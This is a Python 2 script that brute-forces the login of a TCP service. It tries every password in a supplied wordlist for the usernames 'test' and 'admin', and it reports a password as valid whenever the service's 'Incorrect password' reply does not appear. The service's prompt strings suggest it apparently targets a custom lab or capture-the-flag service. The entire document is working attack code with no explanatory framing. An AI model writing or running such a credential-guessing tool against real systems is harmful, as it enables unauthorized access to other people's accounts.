import socket
import sys
import time

valid_usernames = ['test', 'admin']

if __name__ == "__main__":
	startTime = time.time()

	if len( sys.argv ) > 3:
		host = sys.argv[ 1 ]
		port = int( sys.argv[ 2 ] )
		file = sys.argv[ 3 ]
	else:
		print "Usage python " + sys.argv[ 0 ] + " <host> <port> <dictionary>"
		sys.exit( -1 )

	try:
		fd = open( file, 'r' )
	except:
		print "[-] Error in file open!"
		sys.exit( -2 )

	buf = fd.read().split( '\n' )
	
	for username in valid_usernames:
		for password in buf:
			if password == '':
				continue

			client = socket.socket()
			client.connect( ( host, port ) )

			data = client.recv( 2048 )

			while "Username: " not in data:
				data = client.recv( 2048 )
			
			client.send( username + "\n" )

			data = client.recv( 1024 )
			
			while "[?] Enter the password: " not in data:
				data = client.recv( 1024 )

			client.send( password + "\n" )

			data = ''
			_data = client.recv( 1024 )

			while _data != '':
				data += _data
				client.settimeout( 0.5 )
				try: 
					_data = client.recv( 1024 )
				except:
					break
					
			if "[-] Incorrect password!" not in data:
				print "valid password for <%s> is <%s>" % ( username, password )
				continue

			client.close()